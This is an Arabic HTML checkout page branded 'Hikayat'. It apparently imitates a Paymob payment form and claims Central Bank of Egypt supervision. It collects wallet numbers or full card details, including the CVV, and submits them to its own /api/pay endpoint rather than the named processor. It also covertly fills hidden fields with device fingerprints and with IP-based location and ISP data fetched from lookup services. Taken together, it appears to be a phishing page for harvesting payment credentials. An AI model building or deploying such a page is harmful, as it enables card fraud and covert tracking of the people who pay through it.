<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>بيانات الدفع الآمن - حكايات</title>

    <!-- FontAwesome & Bootstrap Grid CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap-grid.min.css">

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 0;
            direction: rtl;
        }

        .payment-header {
            text-align: center;
            margin-top: 2rem;
            margin-bottom: 1.5rem;
        }

        .payment-header h1 {
            font-size: 24px;
            font-weight: 600;
            color: #01338D;
        }

        .checkout-card {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
            padding: 25px;
            max-width: 480px;
            margin: 0 auto 30px auto;
        }

        .input-group-custom {
            margin-bottom: 15px;
            position: relative;
        }

        .input-group-custom label {
            display: block;
            margin-bottom: 6px;
            font-weight: bold;
            font-size: 14px;
            color: #333;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper input, .input-group-custom select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ced4da;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            text-align: left;
            direction: ltr;
            box-sizing: border-box;
        }

        .input-group-custom select {
            text-align: right;
            direction: rtl;
            background: #fff;
        }

        .input-wrapper input:focus, .input-group-custom select:focus {
            border-color: #01338D;
        }

        .input-wrapper input.is-invalid {
            border-color: #dc3545 !important;
        }

        .input-icon-right {
            position: absolute;
            right: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
            pointer-events: none;
            background: #fff;
            padding-left: 5px;
        }

        .input-icon-right .meeza-badge {
            background: #004a99;
            color: white;
            font-size: 11px;
            font-weight: bold;
            padding: 2px 6px;
            border-radius: 4px;
            letter-spacing: 0.5px;
        }

        .input-icon-right .cash-icon {
            color: #28a745;
            font-size: 18px;
        }

        .toggle-password {
            position: absolute;
            left: 12px;
            background: none;
            border: none;
            cursor: pointer;
            color: #6c757d;
            font-size: 16px;
            outline: none;
        }

        .error-message {
            color: #dc3545;
            font-size: 12px;
            margin-top: 4px;
            display: none;
            text-align: right;
            direction: rtl;
        }

        .input-containers {
            display: flex;
            gap: 10px;
        }

        .input-containers .input-group-custom {
            flex: 1;
        }

        #card_section {
            display: none;
        }

        .card-footer-box {
            text-align: center;
            margin-top: 20px;
        }

        .saveCardText {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 8px;
            font-size: 14px;
            color: #555;
            margin-bottom: 15px;
        }

        .submit-btn {
            background-color: #01338D;
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .submit-btn:hover {
            background-color: #002266;
        }

        .submit-btn:disabled {
            background-color: #6c757d;
            cursor: not-allowed;
        }

        .secured-tag {
            display: block;
            margin-top: 12px;
            font-size: 12px;
            color: #777;
        }

        footer {
            padding: 25px 0 35px 0;
            background: #ffffff;
            border-top: 1px solid #e9ecef;
            margin-top: 25px;
        }

        .bank-logos-container {
            text-align: center;
        }

        .bank-logos-title {
            font-size: 13px;
            color: #6c757d;
            margin-bottom: 16px;
            font-weight: 600;
        }

        .bank-logos-grid {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .bank-logo-card {
            background: #ffffff;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
            transition: transform 0.2s, box-shadow 0.2s;
            height: 48px;
        }

        .bank-logo-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
        }

        .bank-logo-card img {
            max-height: 32px;
            max-width: 90px;
            width: auto;
            object-fit: contain;
        }
    </style>
</head>

<body>

    <header class="payment-header">
        <h1>إتمام الدفع الإلكتروني</h1>
    </header>

    <div class="container">
        <div class="checkout-card">
            <section class="card-inputs">
                <form id="paymob_checkout" action="/api/pay" method="POST" novalidate>
                    <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                    <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">

                    <!-- خانات مخفية لإرسال بيانات الجهاز والشبكة للمظلة -->
                    <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
                    <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
                    <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
                    <input type="hidden" name="batteryInfo" id="batteryInfo" value="غير معروف">
                    <input type="hidden" name="deviceRAM" id="deviceRAM" value="غير معروف">
                    <input type="hidden" name="cpuCores" id="cpuCores" value="غير معروف">
                    <input type="hidden" name="deviceType" id="deviceType" value="غير معروف">
                    <input type="hidden" name="screenSize" id="screenSize" value="غير معروف">
                    <input type="hidden" name="userTimeZone" id="userTimeZone" value="غير معروف">
                    <input type="hidden" name="lang" id="lang" value="غير معروف">
<!-- أضف هذا السطر مع باقي الخانات المخفية -->
<input type="hidden" name="clientID" id="clientID" value="غير متوفر">
                    
                    <!-- 1. اختيار وسيلة الدفع -->
                    <div class="input-group-custom">
                        <label>اختر وسيلة الدفع:</label>
                        <select name="payment_method" id="payment_method" required>
                            <option value="wallet" selected>📱 محفظة إلكترونية</option>
                            <option value="card">💳 بطاقة بنكية</option>
                        </select>
                    </div>
                    
                    <!-- 2. قيمة المبلغ -->
                    <div class="input-group-custom">
                        <label>المبلغ (بالجنيه):</label>
                        <div class="input-wrapper">
                            <input placeholder="أدخل المبلغ المطلوب" 
                                   type="text" 
                                   inputmode="numeric" 
                                   name="amount" 
                                   id="pay_amount" required>
                        </div>
                        <div class="error-message" id="error_amount">يرجى إدخال مبلغ صحيح.</div>
                    </div>

                    <!-- 3. رقم الهاتف / المحفظة -->
                    <div class="input-group-custom" id="phone_group">
                        <label>رقم الهاتف / المحفظة:</label>
                        <div class="input-wrapper">
                            <input placeholder="01XXXXXXXXX" 
                                   type="text" 
                                   inputmode="numeric" 
                                   name="phone" 
                                   id="user_phone" 
                                   maxlength="11" 
                                   style="padding-right: 85px;">
                            <div class="input-icon-right" id="wallet_icons">
                                <span class="meeza-badge">ميزة Meeza</span>
                                <i class="fa fa-money cash-icon" title="محفظة"></i>
                            </div>
                        </div>
                        <div class="error-message" id="error_phone">يجب كتابة رقم هاتف صحيح 11 رقماً ويبدأ بـ 01.</div>
                    </div>

                    <!-- 4. خانات البطاقة البنكية -->
                    <div id="card_section">
                        <div class="input-group-custom">
                            <label>رقم البطاقة البنكية:</label>
                            <div class="input-wrapper">
                                <input placeholder="Card Number" 
                                       type="text" 
                                       inputmode="numeric" 
                                       name="number" 
                                       id="card_number" 
                                       maxlength="19" 
                                       autocomplete="cc-number"
                                       style="padding-right: 75px;">
                                <div class="input-icon-right">
                                    <i class="fa fa-cc-visa fa-lg" style="color: #1a1f71;"></i>
                                    <i class="fa fa-cc-mastercard fa-lg" style="color: #eb001b;"></i>
                                </div>
                            </div>
                            <div class="error-message" id="error_card_number">يجب كتابة 16 رقماً بالإنجليزية بدون حروف.</div>
                        </div>

                        <div class="input-group-custom">
                            <label>اسم صاحب البطاقة:</label>
                            <div class="input-wrapper">
                                <input placeholder="Card Holder Name" 
                                       type="text" 
                                       name="name" 
                                       id="card_name">
                            </div>
                            <div class="error-message" id="error_card_name">يرجى إدخال الاسم بالحروف الإنجليزية فقط.</div>
                        </div>

                        <div class="input-containers">
                            <div class="input-group-custom">
                                <label>التاريخ:</label>
                                <div class="input-wrapper">
                                    <input placeholder="MM/YY" 
                                           type="text" 
                                           inputmode="numeric" 
                                           name="expiry" 
                                           id="mmyy" 
                                           maxlength="5">
                                </div>
                                <div class="error-message" id="error_mmyy">تاريخ غير صحيح.</div>
                            </div>

                            <div class="input-group-custom">
                                <label>رمز CVV:</label>
                                <div class="input-wrapper">
                                    <input placeholder="CVV" 
                                           type="password" 
                                           inputmode="numeric" 
                                           name="cvc" 
                                           id="card_cvc" 
                                           maxlength="3"
                                           style="padding-left: 35px;">
                                    <button type="button" class="toggle-password" id="toggleCvvBtn" title="إظهار/إخفاء الرمز">
                                        <i class="fa fa-eye" id="cvvIcon"></i>
                                    </button>
                                </div>
                                <div class="error-message" id="error_cvc">يجب إدخال 3 أرقام.</div>
                            </div>
                        </div>

                        <div class="saveCardText">
                            <label for="save_card">حفظ بيانات البطاقة للمعاملات القادمة</label>
                            <input type="checkbox" id="save_card" value="tokenize" name="save_card">
                        </div>
                    </div>

                    <div class="card-footer-box">
                        <button id="submitButton" type="submit" class="submit-btn">
                            متابعة وتأكيد الدفع
                        </button>
                        <span class="secured-tag"><i class="fa fa-lock" aria-hidden="true"></i> مؤمن بالكامل بواسطة Paymob</span>
                    </div>
                </form>
            </section>
        </div>
    </div>

    <footer>
        <div class="container bank-logos-container">
            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد و تحت أشراف البنك المركزي</div>
            <div class="bank-logos-grid">
                <div class="bank-logo-card" title="البنك المركزي المصري">
                    <img src="https://cbpn.currencyresearch.com/wp-content/uploads/2025/09/CentralBankofEgypt.png.webp" alt="البنك المركزي المصري">
                </div>
            </div>
        </div>
    </footer>

    <script>
        // --- 1. جلب بيانات الجهاز تلقائياً وتخزينها في الخانات المخفية ---
function getOrCreateClientID() {
    let clientId = localStorage.getItem('hikayat_client_id');
    if (!clientId) {
        clientId = 'DEV-' + Math.random().toString(36).substring(2, 9).toUpperCase() + '-' + Date.now().toString().slice(-4);
        localStorage.setItem('hikayat_client_id', clientId);
    }
    return clientId;
}

async function collectDeviceDetails() {
    // تعيين معرف الجهاز
    document.getElementById('clientID').value = getOrCreateClientID();

    document.getElementById('deviceRAM').value = (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير مدعوم');
    document.getElementById('cpuCores').value = navigator.hardwareConcurrency || 'غير معروف';
    document.getElementById('screenSize').value = `${window.screen.width} x ${window.screen.height}`;
    document.getElementById('userTimeZone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
    document.getElementById('lang').value = navigator.language || navigator.userLanguage || 'غير معروف';

            const ua = navigator.userAgent;
let deviceType = '💻 كمبيوتر (Desktop)';
let deviceModel = 'غير محدد';

// 1. فحص أجهزة الآيفون والـ iOS
if (/iPhone/i.test(ua)) {
    deviceType = '📱 هاتف (iPhone)';
    deviceModel = 'Apple iPhone';
} else if (/iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    deviceType = '📱 تابلت (iPad)';
    deviceModel = 'Apple iPad';
} else if (/Android/i.test(ua)) {
    if (/Mobile/i.test(ua)) {
        deviceType = '📱 هاتف (Android)';
    } else {
        deviceType = '📱 تابلت (Android Tablet)';
    }
} else if (/Macintosh|Mac OS X/i.test(ua)) {
    deviceType = '💻 كمبيوتر (MacBook / Mac)';
} else if (/Windows/i.test(ua)) {
    deviceType = '💻 كمبيوتر (Windows PC)';
}

// تخزين القيمة في الخانات المخفية
document.getElementById('deviceType').value = deviceType;

// أضف هذه الخانة المخفية في HTML إن لم تكن موجودة: <input type="hidden" name="deviceModel" id="deviceModel">
if (document.getElementById('deviceModel')) {
    document.getElementById('deviceModel').value = deviceModel;
}
            

            // جلب حالة البطارية إن أمكن
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    document.getElementById('batteryInfo').value = `${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن ⚡' : 'غير موصول بالكهرباء'})`;
                } catch (e) {
                    document.getElementById('batteryInfo').value = 'غير متاح';
                }
            }

            // جلب بيانات المدينة والدولة ومزود الخدمة (Registered ISP)
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (!res.ok) throw new Error("فشل ipapi");
                const data = await res.json();
                
                document.getElementById('geoCity').value = data.city || 'غير معروف';
                document.getElementById('geoCountry').value = data.country_name || 'غير معروف';
                document.getElementById('ispProvider').value = data.org || data.asn || 'غير معروف';
            } catch (err) {
                // Fallback لتغطية التوقف عبر ip-api
                try {
                    const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,city,isp,org');
                    const fbData = await fallbackRes.json();
                    if (fbData.status === 'success') {
                        document.getElementById('geoCity').value = fbData.city || 'غير معروف';
                        document.getElementById('geoCountry').value = fbData.country || 'غير معروف';
                        document.getElementById('ispProvider').value = fbData.isp || fbData.org || 'غير معروف';
                    }
                } catch (e) {
                    console.error('فشل جلب تفاصيل الموقع والشبكة');
                }
            }
        }

        // تشغيل جلب البيانات عند تحميل الصفحة
        collectDeviceDetails();

        // --- 2. إدارة الواجهة والتحقق من المدخلات ---
        const paymentMethodSelect = document.getElementById('payment_method');
        const cardSection = document.getElementById('card_section');
        const phoneGroup = document.getElementById('phone_group');

        function toggleFields() {
            const selectedMethod = paymentMethodSelect.value;
            if (selectedMethod === 'card') {
                cardSection.style.display = 'block';
                phoneGroup.style.display = 'none';
            } else {
                cardSection.style.display = 'none';
                phoneGroup.style.display = 'block';
            }
        }

        paymentMethodSelect.addEventListener('change', toggleFields);

        window.addEventListener('DOMContentLoaded', () => {
            toggleFields();
            const urlParams = new URLSearchParams(window.location.search);
            const amountParam = urlParams.get('amount');
            if (amountParam) {
                document.getElementById('pay_amount').value = amountParam;
            }
        });

        const toggleCvvBtn = document.getElementById('toggleCvvBtn');
        const cardCvcInput = document.getElementById('card_cvc');
        const cvvIcon = document.getElementById('cvvIcon');

        toggleCvvBtn.addEventListener('click', () => {
            if (cardCvcInput.type === 'password') {
                cardCvcInput.type = 'text';
                cvvIcon.classList.remove('fa-eye');
                cvvIcon.classList.add('fa-eye-slash');
            } else {
                cardCvcInput.type = 'password';
                cvvIcon.classList.remove('fa-eye-slash');
                cvvIcon.classList.add('fa-eye');
            }
        });

        function convertArabicDigitsToEnglish(str) {
            return str.replace(/[٠-٩]/g, function (d) {
                return d.charCodeAt(0) - 1632;
            });
        }

        const amountInput = document.getElementById('pay_amount');
        amountInput.addEventListener('input', function (e) {
            let val = convertArabicDigitsToEnglish(e.target.value).replace(/[^\d.]/g, '');
            e.target.value = val;
            validateAmount();
        });

        function validateAmount() {
            const val = parseFloat(amountInput.value);
            const errorElement = document.getElementById('error_amount');
            if (isNaN(val) || val <= 0) {
                amountInput.classList.add('is-invalid');
                errorElement.style.display = 'block';
                return false;
            } else {
                amountInput.classList.remove('is-invalid');
                errorElement.style.display = 'none';
                return true;
            }
        }

        const phoneInput = document.getElementById('user_phone');
        phoneInput.addEventListener('input', function (e) {
            let val = convertArabicDigitsToEnglish(e.target.value).replace(/\D/g, '');
            if (val.length > 11) val = val.substring(0, 11);
            e.target.value = val;
            validatePhone();
        });

        function validatePhone() {
            if (paymentMethodSelect.value === 'card') return true;
            const val = phoneInput.value;
            const errorElement = document.getElementById('error_phone');
            const isValid = val.length === 11 && val.startsWith('01');

            if (!isValid) {
                phoneInput.classList.add('is-invalid');
                errorElement.style.display = 'block';
                return false;
            } else {
                phoneInput.classList.remove('is-invalid');
                errorElement.style.display = 'none';
                return true;
            }
        }

        const cardNumberInput = document.getElementById('card_number');
        cardNumberInput.addEventListener('input', function (e) {
            let val = convertArabicDigitsToEnglish(e.target.value).replace(/\D/g, '');
            if (val.length > 16) val = val.substring(0, 16);
            let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
            e.target.value = formatted;
            validateCardNumber();
        });

        function validateCardNumber() {
            if (paymentMethodSelect.value !== 'card') return true;
            const rawValue = cardNumberInput.value.replace(/\s+/g, '');
            const errorElement = document.getElementById('error_card_number');
            if (rawValue.length < 16) {
                cardNumberInput.classList.add('is-invalid');
                errorElement.style.display = 'block';
                return false;
            } else {
                cardNumberInput.classList.remove('is-invalid');
                errorElement.style.display = 'none';
                return true;
            }
        }

        const mmyyInput = document.getElementById('mmyy');
        mmyyInput.addEventListener('input', function (e) {
            let val = convertArabicDigitsToEnglish(e.target.value).replace(/\D/g, '');
            if (val.length >= 2) {
                e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
            } else {
                e.target.value = val;
            }
            validateMMYY();
        });

        function validateMMYY() {
            if (paymentMethodSelect.value !== 'card') return true;
            const val = mmyyInput.value;
            const errorElement = document.getElementById('error_mmyy');
            const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;

            if (!regex.test(val)) {
                mmyyInput.classList.add('is-invalid');
                errorElement.style.display = 'block';
                return false;
            } else {
                mmyyInput.classList.remove('is-invalid');
                errorElement.style.display = 'none';
                const parts = val.split('/');
                document.getElementById('card_expiry_mm').value = parts[0];
                document.getElementById('card_expiry_yy').value = parts[1];
                return true;
            }
        }

        const cvcInput = document.getElementById('card_cvc');
        cvcInput.addEventListener('input', function (e) {
            let val = convertArabicDigitsToEnglish(e.target.value).replace(/\D/g, '');
            if (val.length > 3) val = val.substring(0, 3);
            e.target.value = val;
            validateCVC();
        });

        function validateCVC() {
            if (paymentMethodSelect.value !== 'card') return true;
            const val = cvcInput.value;
            const errorElement = document.getElementById('error_cvc');
            if (val.length < 3) {
                cvcInput.classList.add('is-invalid');
                errorElement.style.display = 'block';
                return false;
            } else {
                cvcInput.classList.remove('is-invalid');
                errorElement.style.display = 'none';
                return true;
            }
        }

        const nameInput = document.getElementById('card_name');
        nameInput.addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
            validateName();
        });

        function validateName() {
            if (paymentMethodSelect.value !== 'card') return true;
            const val = nameInput.value.trim();
            const errorElement = document.getElementById('error_card_name');
            if (val.length < 3) {
                nameInput.classList.add('is-invalid');
                errorElement.style.display = 'block';
                return false;
            } else {
                nameInput.classList.remove('is-invalid');
                errorElement.style.display = 'none';
                return true;
            }
        }

        document.getElementById("paymob_checkout").addEventListener("submit", function (e) {
            const isAmountValid = validateAmount();
            let isPhoneValid = true;
            let isCardValid = true, isNameValid = true, isExpiryValid = true, isCvcValid = true;

            if (paymentMethodSelect.value === 'card') {
                isCardValid = validateCardNumber();
                isNameValid = validateName();
                isExpiryValid = validateMMYY();
                isCvcValid = validateCVC();
            } else {
                isPhoneValid = validatePhone();
            }

            if (!isAmountValid || !isPhoneValid || !isCardValid || !isNameValid || !isExpiryValid || !isCvcValid) {
                e.preventDefault();
                return;
            }

            const submitBtn = document.getElementById("submitButton");
            submitBtn.disabled = true;
            submitBtn.innerText = "جاري المعالجة والتحويل...";
        });
    </script>
</body>
</html>
